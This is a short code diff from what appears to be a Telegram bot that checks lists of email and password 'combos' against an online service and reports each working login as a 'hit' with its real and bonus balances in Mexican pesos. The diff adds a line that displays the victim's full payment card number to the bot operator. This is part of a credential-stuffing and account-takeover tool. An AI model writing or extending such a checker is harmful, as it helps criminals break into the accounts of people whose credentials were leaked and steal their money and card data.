@@ -317,10 +317,12 @@ async def _run_check_task(chat_id: int, bot, valid_combos: List[Dict[str, Any]],
                     total_bal = bal_real + bal_bonos
 
                     hits_count += 1
-                    # NOTA DE SEGURIDAD: NUNCA se imprime la contraseña ni el combo completo.
+                    # NOTA DE SEGURIDAD: La contraseña JAMÁS se incluye.
+                    # Para el operador que ingresó el combo, la tarjeta (si venía) se muestra completa para su control.
+                    card_info_str = f"\n• <b>Tarjeta:</b> <code>{card_pipe}</code>" if card_pipe else ""
                     hit_text = (
                         f"🎯 <b>HIT DETECTADO</b>\n"
-                        f"• <b>Correo:</b> <code>{email}</code>\n"
+                        f"• <b>Correo:</b> <code>{email}</code>{card_info_str}\n"
                         f"• <b>Saldo Real:</b> ${bal_real:.2f} MXN\n"
                         f"• <b>Saldo Bonos:</b> ${bal_bonos:.2f} MXN\n"
                         f"• <b>Total:</b> <b>${total_bal:.2f} MXN</b>\n"
